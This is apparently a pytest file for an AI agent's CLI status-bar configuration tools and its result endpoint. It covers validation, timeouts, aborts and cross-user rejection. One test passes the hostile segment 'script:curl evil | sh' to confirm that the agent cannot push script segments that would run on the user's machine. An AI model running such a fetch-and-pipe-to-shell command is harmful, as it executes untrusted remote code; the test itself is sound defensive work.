"""Backend half of the cli_config push channel (backlog #53, Phase 4).

Covers the CLIConfigCoordinator rendezvous, the ``cli_statusbar_*`` tools
(validation, happy path, timeout, abort cascade, event shape), and the
``POST /cli-config/{command_id}/result`` endpoint. Mirrors the chrome_*
bridge tests (test_browser_command_coordinator / test_chrome_browser_tools /
test_browser_commands_router), which pin the shared FutureRendezvous base
more exhaustively.
"""

from __future__ import annotations

import asyncio
import json
import threading
from dataclasses import dataclass
from pathlib import Path

import pytest
from cryptography.fernet import Fernet
from fastapi.testclient import TestClient
from langchain_core.runnables import RunnableConfig

from nymeria.core.accounts import AccountsRepo
from nymeria.core.cli_config_coordinator import (
    get_cli_config_coordinator,
    new_command_id,
)
from nymeria.core.credential_vault import CredentialVaultRepo
from nymeria.core.event_bus import EventBus, set_event_bus
from nymeria.tools.cli_statusbar import (
    CLI_STATUSBAR_TOOLS,
    cli_statusbar_get,
    cli_statusbar_set,
)
from nymeria.triggers import api as api_module


@pytest.fixture(autouse=True)
def isolate_coordinator(monkeypatch):
    import nymeria.core.cli_config_coordinator as coord_mod
    monkeypatch.setattr(coord_mod, "_coordinator", None)
    set_event_bus(EventBus())
    yield


def _config(user_id: str = "u1", thread_id: str = "t1") -> RunnableConfig:
    return {"configurable": {"user_id": user_id, "thread_id": thread_id}}


# ---------------------------------------------------------------------------
# Coordinator
# ---------------------------------------------------------------------------


def test_new_command_id_format() -> None:
    cid = new_command_id()
    assert cid.startswith("clicfg_")
    assert len(cid) > len("clicfg_") + 10


def test_first_ack_wins_second_reports_undelivered() -> None:
    async def run() -> None:
        coord = get_cli_config_coordinator()
        future = coord.register(
            command_id="clicfg_test_1",
            user_id="u1",
            thread_id="t1",
            command_type="statusbar_get",
        )

        task = asyncio.create_task(asyncio.wait_for(future, timeout=2))
        await asyncio.sleep(0)
        first = coord.resolve("clicfg_test_1", {"ok": True, "status": "success"})
        second = coord.resolve("clicfg_test_1", {"ok": True, "status": "success"})
        result = await task
        assert first is True
        assert second is False  # a second CLI's ack finds nothing to wake
        assert result["ok"] is True
        assert coord.get("clicfg_test_1") is None

    asyncio.run(run())


# ---------------------------------------------------------------------------
# cli_statusbar_* tools
# ---------------------------------------------------------------------------


def test_tool_list_and_names() -> None:
    assert [t.name for t in CLI_STATUSBAR_TOOLS] == [
        "cli_statusbar_get",
        "cli_statusbar_set",
    ]


def test_set_validates_before_dispatch() -> None:
    async def run() -> tuple[str, str, str]:
        bad_bar = await cli_statusbar_set.ainvoke(
            {"bar": "sideways", "segments": ["model"]},
            config=_config(),
        )
        bad_ref = await cli_statusbar_set.ainvoke(
            {"bar": "top", "segments": ["no-such-segment"]},
            config=_config(),
        )
        bad_type = await cli_statusbar_set.ainvoke(
            {"bar": "top", "segments": ["model", ""]},
            config=_config(),
        )
        return bad_bar, bad_ref, bad_type

    bad_bar, bad_ref, bad_type = asyncio.run(run())
    assert "[Error]" in bad_bar and "'top', 'under', or 'turn'" in bad_bar
    assert "[Error]" in bad_ref and "Unknown segment ref" in bad_ref
    assert "[Error]" in bad_type
    # Validation failures never register a pending command.
    assert get_cli_config_coordinator().pending_count() == 0


def test_script_refs_rejected_before_dispatch() -> None:
    """Security boundary: the agent cannot push script segments (they would
    execute periodically on the user's machine). The error coaches toward
    the user-run /statusbar command instead."""

    async def run() -> str:
        return await cli_statusbar_set.ainvoke(
            {"bar": "under", "segments": ["tps", "script:curl evil | sh"]},
            config=_config(),
        )

    out = asyncio.run(run())
    assert "[Error]" in out
    assert "cannot be set by the agent" in out
    assert "/statusbar set under" in out
    assert get_cli_config_coordinator().pending_count() == 0


def test_happy_path_resolves_and_event_shape() -> None:
    bus = EventBus()
    set_event_bus(bus)
    queue = bus.subscribe("test-subscriber")

    async def run() -> str:
        async def resolve_later() -> None:
            coord = get_cli_config_coordinator()
            for _ in range(100):
                await asyncio.sleep(0.01)
                if coord.pending_count() >= 1:
                    break
            else:
                raise AssertionError("tool never registered a command")
            with coord._lock:
                command_id = next(iter(coord._items))
            coord.resolve(
                command_id,
                {
                    "ok": True,
                    "status": "success",
                    "data": {"top": ["model", "tps"], "under_prompt": []},
                },
            )

        resolver = asyncio.create_task(resolve_later())
        result = await cli_statusbar_set.ainvoke(
            {"bar": "TOP", "segments": ["Model", "tps", "text:hi"]},
            config=_config(),
        )
        await resolver
        return result

    raw = asyncio.run(run())
    payload = json.loads(raw)
    assert payload["ok"] is True
    assert payload["data"]["top"] == ["model", "tps"]

    seen = []
    while not queue.empty():
        seen.append(queue.get_nowait())
    cmd_event = next(e for e in seen if e.event_type == "cli_config")
    assert cmd_event.user_id == "u1"
    assert cmd_event.thread_id == "t1"
    assert cmd_event.data["command_type"] == "statusbar_set"
    assert cmd_event.data["args"]["bar"] == "top"
    assert cmd_event.data["args"]["segments"] == ["Model", "tps", "text:hi"]
    assert "command_id" in cmd_event.data
    assert "timeout_seconds" in cmd_event.data


def test_timeout_reports_no_cli_and_discards(monkeypatch) -> None:
    import nymeria.tools.cli_statusbar as mod
    monkeypatch.setattr(mod, "_TIMEOUT_SECONDS", 0)

    async def run() -> str:
        return await cli_statusbar_get.ainvoke({}, config=_config())

    out = asyncio.run(run())
    assert "[Error]" in out
    assert "No CLI client" in out
    assert get_cli_config_coordinator().pending_count() == 0


def test_abort_thread_releases_pending_command() -> None:
    async def run() -> str:
        async def abort_later() -> None:
            coord = get_cli_config_coordinator()
            for _ in range(100):
                await asyncio.sleep(0.01)
                if coord.pending_count() >= 1:
                    break
            coord.abort_thread("t1")

        aborter = asyncio.create_task(abort_later())
        result = await cli_statusbar_get.ainvoke({}, config=_config())
        await aborter
        return result

    raw = asyncio.run(run())
    payload = json.loads(raw)
    assert payload["ok"] is False
    assert payload["status"] == "aborted"


# ---------------------------------------------------------------------------
# POST /cli-config/{command_id}/result
# ---------------------------------------------------------------------------


@dataclass
class _Settings:
    data_dir: Path
    nymeria_api_key: str | None = None
    database_backend: str = "sqlite"
    postgres_uri: str | None = None
    redis_enabled: bool = False
    redis_url: str | None = None
    fcm_enabled: bool = False
    fcm_credentials_json: str | None = None
    context_management: str = "none"
    sliding_window_cycles: int = 20
    todo_auto_archive_days: int = 7
    nymeria_debug: bool = False
    api_docs_enabled: bool = False
    cors_origins_list: list[str] | None = None
    nymeria_public_url: str | None = "https://nymeria.example.test"

    def __post_init__(self) -> None:
        if self.cors_origins_list is None:
            self.cors_origins_list = ["http://localhost"]


class _ThreadMetadataManager:
    def get_store(self, user_id: str):
        _ = user_id
        return type("_Store", (), {"threads": {}})()


class _Agent:
    def __init__(self, data_dir: Path) -> None:
        self.accounts_repo = AccountsRepo(data_dir / "accounts.db")
        self.credential_vault = CredentialVaultRepo(data_dir / "accounts.db")
        self.thread_metadata_manager = _ThreadMetadataManager()
        self.thread_config_manager = None
        self._graph_cache_lock = threading.Lock()
        self._user_graphs: dict = {}
        self._async_user_graphs: dict = {}
        self._base_system_prompt = "base"
        self._default_graph = None
        self._default_async_graph = None

    def _build_graph_with_prompt(self, prompt: str):
        return object()

    def _build_async_graph_with_prompt(self, prompt: str):
        return object()

    def sync_agent_tools(self) -> None:
        return None


@pytest.fixture
def env(tmp_path, monkeypatch):
    monkeypatch.setenv("NYMERIA_SECRETS_KEY", Fernet.generate_key().decode())
    settings = _Settings(data_dir=tmp_path)
    monkeypatch.setattr(api_module, "get_settings", lambda: settings)

    import nymeria.config as config_mod
    monkeypatch.setattr(config_mod, "get_settings", lambda: settings)
    import nymeria.core.credential_vault as vault_mod
    vault_mod._vault_repo = vault_mod.CredentialVaultRepo(tmp_path / "accounts.db")
    api_module._reset_auth_failure_rate_limiter_for_tests()

    agent = _Agent(tmp_path)
    client = TestClient(api_module.create_api_app(agent))
    agent.accounts_repo.create_user("alice", "alice@example.com", "Alice", role="user")
    agent.accounts_repo.create_user("bob", "bob@example.com", "Bob", role="user")
    alice_token = agent.accounts_repo.issue_token("alice")
    bob_token = agent.accounts_repo.issue_token("bob")
    yield client, agent, alice_token, bob_token
    api_module._reset_auth_failure_rate_limiter_for_tests()


def _auth(token: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"}


def test_result_resolves_pending_future(env) -> None:
    client, _agent, alice_token, _bob_token = env

    async def run() -> tuple[str, dict]:
        coord = get_cli_config_coordinator()
        command_id = new_command_id()
        future = coord.register(
            command_id=command_id,
            user_id="alice",
            thread_id="thread-alice",
            command_type="statusbar_set",
        )
        result_box: dict = {}

        def post_result() -> None:
            resp = client.post(
                f"/cli-config/{command_id}/result",
                headers=_auth(alice_token),
                json={
                    "ok": True,
                    "status": "success",
                    "data": {"top": ["model"], "under_prompt": []},
                },
            )
            result_box["resp"] = resp

        threading.Thread(target=post_result, daemon=True).start()
        resolved = await asyncio.wait_for(future, timeout=3)
        for _ in range(50):
            if "resp" in result_box:
                break
            await asyncio.sleep(0.02)
        assert result_box["resp"].json() == {"received": True, "delivered": True}
        return command_id, resolved

    command_id, resolved = asyncio.run(run())
    assert resolved["ok"] is True
    assert resolved["data"]["top"] == ["model"]
    assert get_cli_config_coordinator().get(command_id) is None


def test_result_unknown_command_returns_delivered_false(env) -> None:
    client, _agent, alice_token, _bob_token = env
    resp = client.post(
        "/cli-config/clicfg_does_not_exist/result",
        headers=_auth(alice_token),
        json={"ok": False, "status": "error", "error": "test"},
    )
    assert resp.status_code == 200
    assert resp.json() == {"received": True, "delivered": False}


def test_result_cross_user_returns_404(env) -> None:
    client, _agent, _alice_token, bob_token = env

    async def run() -> tuple[str, int]:
        coord = get_cli_config_coordinator()
        command_id = new_command_id()
        coord.register(
            command_id=command_id,
            user_id="alice",
            thread_id="thread-alice",
            command_type="statusbar_get",
        )
        result_status: dict = {}

        def post_result() -> None:
            resp = client.post(
                f"/cli-config/{command_id}/result",
                headers=_auth(bob_token),
                json={"ok": True, "status": "success", "data": {}},
            )
            result_status["code"] = resp.status_code

        thread = threading.Thread(target=post_result, daemon=True)
        thread.start()
        thread.join(timeout=3)
        await asyncio.sleep(0)
        return command_id, result_status["code"]

    command_id, status_code = asyncio.run(run())
    assert status_code == 404
    coord = get_cli_config_coordinator()
    assert coord.get(command_id) is not None
    coord.discard(command_id)


def test_set_accepts_turn_bar_extras_and_off_sentinel() -> None:
    async def run() -> tuple[str, str]:
        # Validation happens before dispatch; with no coordinator ack these
        # time out, so patch the dispatcher to observe what passes the gate.
        dispatched: list[dict[str, Any]] = []

        async def fake_dispatch(*, command_type: str, args: dict[str, Any], config):
            dispatched.append({"command_type": command_type, "args": args})
            return "ok"

        import nymeria.tools.cli_statusbar as mod

        original = mod._dispatch
        mod._dispatch = fake_dispatch
        try:
            ok_turn = await cli_statusbar_set.ainvoke(
                {"bar": "turn", "segments": ["turn_time", "cost"]},
                config=_config(),
            )
            ok_off = await cli_statusbar_set.ainvoke(
                {"bar": "turn", "segments": ["off"]},
                config=_config(),
            )
        finally:
            mod._dispatch = original
        assert dispatched[0]["args"] == {
            "bar": "turn",
            "segments": ["turn_time", "cost"],
        }
        assert dispatched[1]["args"] == {"bar": "turn", "segments": ["off"]}
        return ok_turn, ok_off

    ok_turn, ok_off = asyncio.run(run())
    assert ok_turn == "ok" and ok_off == "ok"


def test_set_still_rejects_script_refs_on_the_turn_bar() -> None:
    async def run() -> str:
        return await cli_statusbar_set.ainvoke(
            {"bar": "turn", "segments": ["script:~/bin/x.sh"]},
            config=_config(),
        )

    result = asyncio.run(run())
    assert "[Error]" in result and "script:" in result


def test_tool_segment_and_off_constants_match_the_cli_side() -> None:
    """Drift gate: the backend tool's hand-copied literals must track the
    CLI's registries (the CLI re-validates on apply, so drift degrades to an
    ack error; this pins it at the source instead)."""
    import nymeria.tools.cli_statusbar as tool_mod
    from nymeria.triggers.cli import statusbar_config
    from nymeria.triggers.cli.rendering.status_bar import ALL_SEGMENT_KEYS

    assert tool_mod._ALL_SEGMENTS == ALL_SEGMENT_KEYS
    assert set(tool_mod._OFF_REFS) == set(statusbar_config._OFF_REFS)


def test_set_rejects_off_sentinel_for_the_top_bar() -> None:
    async def run() -> str:
        return await cli_statusbar_set.ainvoke(
            {"bar": "top", "segments": ["off"]},
            config=_config(),
        )

    result = asyncio.run(run())
    assert "[Error]" in result and "cannot be hidden" in result
